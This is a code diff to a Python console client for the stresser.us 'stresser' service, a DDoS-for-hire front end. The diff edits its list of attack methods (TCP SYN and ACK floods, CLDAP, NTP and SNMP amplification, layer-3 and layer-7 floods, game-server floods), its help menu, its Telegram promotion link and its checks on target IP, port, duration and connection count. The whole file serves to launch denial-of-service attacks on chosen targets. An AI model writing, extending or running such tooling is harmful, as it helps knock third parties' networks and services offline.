@@ -6,9 +6,9 @@ from time import sleep
 from sty import fg
 
 _USERNAME="YOUR_NAME"
-_KEY="KEY_HERE" # key from here >> https://stresser.us/
+_KEY="YOUR_KEY" # key from here >> https://stresser.us/
 _DALAY=0.5 # wait delay per req
-_METHODS=["TCPRAW","TCPSYN","TCPACK","TCPTFO","TCPTLS","TCPAMP","VALVE","FIVEM","OVHAMP","OVHTCP","OVHUDP","SNMP","WSD","DVR","NTP","ARD","IGMP","GRE","ESP","IPRAND","TLSV1","TLSV2","BROWSER","UDPBYPASS"]
+_METHODS=["TCPSYN","TCPACK","TCPTFO","TCPTLS","TCPAMP","VALVE","FIVEM","OVHAMP","OVHTCP","CLDAP","SNMP","WSD","DVR","NTP","ARD","IGMP","GRE","ESP","IPRAND","SOCKET","HTTPSV1","HTTPSV2","BROWSER","UDPBYPASS"]
 
 __builtins__.print = lambda text="",end="\r\n": stdout.write(f"{text}{end}");stdout.flush()
 clearconsole = lambda:system("cls || clear")
@@ -34,7 +34,7 @@ def logo():
 \t██▄ ▀   ██    ██▀ ▀▀ ▄█▄▄▄██ ██▄ ▀  ██▄ ▀  ▄█▄▄▄██  ██▀ ▀▀     ██  ██  ██▄ ▀  
 \t▄ ▀█▄▄  ██    ██     ██      ▄ ▀█▄▄ ▄ ▀█▄▄ ██       ██         ██  ██  ▄ ▀█▄▄ 
 \t█▀▄▄█▀  ▀█▄▀ ▄██▄     ▀█▄▄▄▀ █▀▄▄█▀ █▀▄▄█▀  ▀█▄▄▄▀ ▄██▄        ▀█▄▄▀█▄ █▀▄▄█▀ """,_COLOR.logo))
-    printc(makec("\t\t\tdiscord.gg/vT8W3XzNZg and stresser.us\n",_COLOR.invite))
+    printc(makec("\t\t\tt.me/stresseruschat and stresser.us\n",_COLOR.invite))
 
 def realint(s):
     try:return int(s)
@@ -70,11 +70,11 @@ def request(ip,port,time,conn,method):
 def helpcom():
     logo()
     printc(f"""\t\t {makec("╔═════════╦══════════════════════════════════════════════════╗",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("TCP",206)}     ║ {makec("> TCPRAW, TCPSYN, TCPACK, TCPTFO, TCPTLS, TCPAMP",_COLOR.text)} {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> VALVE, FIVEM, OVHAMP, OVHTCP, OVHUDP",_COLOR.text)}           {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> SNMP, WSD, DVR, NTP, ARD",_COLOR.text)}                       {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> cLDAP, SNMP, WSD, DVR, NTP, ARD",_COLOR.text)}                {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("TCP",206)}     ║ {makec("> TCPSYN, TCPACK, TCPTFO, TCPTLS, TCPAMP",_COLOR.text)}         {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> VALVE, FIVEM, OVHAMP, OVHTCP",_COLOR.text)}                   {makec("║",_COLOR.line)}
 \t\t {makec("║",_COLOR.line)} {makec("L3",203)}      ║ {makec("> IGMP, GRE, ESP, IPRAND",_COLOR.text)}                         {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> TLSv1, TLSv2, BROWSER",_COLOR.text)}                          {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> SOCKET, HTTPSv1, HTTPSv2, BROWSER",_COLOR.text)}              {makec("║",_COLOR.line)}
 \t\t {makec("║",_COLOR.line)} {makec("UDP",197)}     ║ {makec("> UDPBYPASS",_COLOR.text)}                                      {makec("║",_COLOR.line)}
 \t\t {makec("╚═════════╩══════════════════════════════════════════════════╝",_COLOR.line)}""")
 
@@ -93,10 +93,11 @@ def main():
     helpcom()
     while 1:
         rawcommands=input(f'{makec(f"{_USERNAME}@us",196)}{makec(":~$",_COLOR.text)}{fg(81)} ').split(" ")
+        #print(rawcommands)
         commands=rawcommands[0].upper()
         args=rawcommands[1:]
         if commands in _METHODS:
-            if len(args) < 3 or not ((commands.startswith("TLS") or commands.startswith("BROWSER")) or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10)):
+            if len(args) < 3 or not ((commands.startswith("HTTPS") or commands.startswith("BROWSER") or commands.startswith("SOCKET")) or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10)):
                 print(makec(f"[*] {commands} <ip/url> <port> <time> <conn>",99))
             else: request(args[0],args[1],args[2],args[3],commands)
         else:   
